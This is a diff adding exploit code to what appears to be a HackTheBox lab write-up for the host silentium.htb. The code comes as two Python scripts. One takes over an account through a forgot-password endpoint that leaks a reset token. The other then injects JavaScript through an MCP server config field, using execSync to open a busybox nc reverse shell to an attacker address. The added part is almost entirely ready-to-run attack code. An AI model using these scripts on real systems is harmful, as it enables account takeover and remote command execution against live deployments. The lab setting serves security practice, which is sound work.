@@ -92,4 +92,143 @@ staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duratio
 ❯ curl -X GET "http://staging.silentium.htb/api/v1/version"
 {"version":"3.0.5"}
 
-```    
+```
+
+
+
+``` python
+
+import requests
+
+url = "http://staging.silentium.htb"
+email = "ben@silentium.htb"
+password = "Test123"
+
+def change_password():
+
+    headers = {'Content-Type': 'application/json'}
+
+    data = {'user': {'email': email}}
+
+    try:
+
+        r = requests.post(url + "/api/v1/account/forgot-password", headers=headers, json=data, timeout=10)
+
+        print("Status:", r.status_code)
+        print("Response:", r.json())
+        if r.status_code == 201:
+
+            r_json = r.json()
+            temp_token = r_json['user']['tempToken']
+
+        data = {'user': {'email': email, 'tempToken': temp_token, "password": password}}
+
+        r = requests.post(url + "/api/v1/account/reset-password", headers=headers, json=data, timeout=10)
+
+        print("[+] Password changed")
+
+    except Exception as e:
+
+        print(f"[-] Error: {e}")
+
+if __name__ == "__main__":
+
+    change_password()
+
+```
+
+
+
+``` python
+
+import requests
+
+url = "http://staging.silentium.htb"
+email = "ben@silentium.htb"
+password = "Test123"
+lhost = "10.10.14.3"
+lport = "443"
+
+
+def change_password():
+
+    headers = {'Content-Type': 'application/json'}
+
+    data = {'user': {'email': email}}
+
+    try:
+
+        r = requests.post(url + "/api/v1/account/forgot-password", headers=headers, json=data, timeout=10)
+
+        print("Status:", r.status_code)
+        print("Response:", r.json())
+        if r.status_code == 201:
+
+            r_json = r.json()
+            temp_token = r_json['user']['tempToken']
+
+        data = {'user': {'email': email, 'tempToken': temp_token, "password": password}}
+
+        r = requests.post(url + "/api/v1/account/reset-password", headers=headers, json=data, timeout=10)
+
+        print("[+] Password changed")
+
+    except Exception as e:
+
+        print(f"[-] Error: {e}")
+
+
+def login():
+
+     try:
+
+         s = requests.Session()
+         data = {"email": email, "password": password}
+         headers = {"Content-Type": "application/json"}
+         r = s.post(url + "/api/v1/auth/login", headers=headers, json=data, timeout=10)
+         return s, r
+
+     except Exception as e:
+
+              print(f"Error: {e}")
+def rce():
+
+    session, response = login()
+    print("Login:", response.status_code)
+
+    cmd = f"busybox nc {lhost} {lport} -e sh"
+    command = f'({{x:(function(){{const cp = process.mainModule.require("child_process");cp.execSync("{cmd}");return 1;}})()}})'
+
+    data = {
+        "loadMethod": "listActions",
+        "inputs": {
+            "mcpServerConfig": command
+        }
+    }
+    session.headers.update({"x-request-from": "internal"})
+
+    try:
+
+        r = session.post(url + "/api/v1/node-load-method/customMCP", json=data, timeout=10)
+
+        print("[+] Command executed")
+
+        print(r.text)
+
+    except requests.exceptions.Timeout:
+
+               print("[+] Got it")
+
+    except Exception as e:
+
+               print(f"Error: {e}")
+
+
+
+if __name__ == "__main__":
+
+        change_password()
+        rce()
+
+```
+
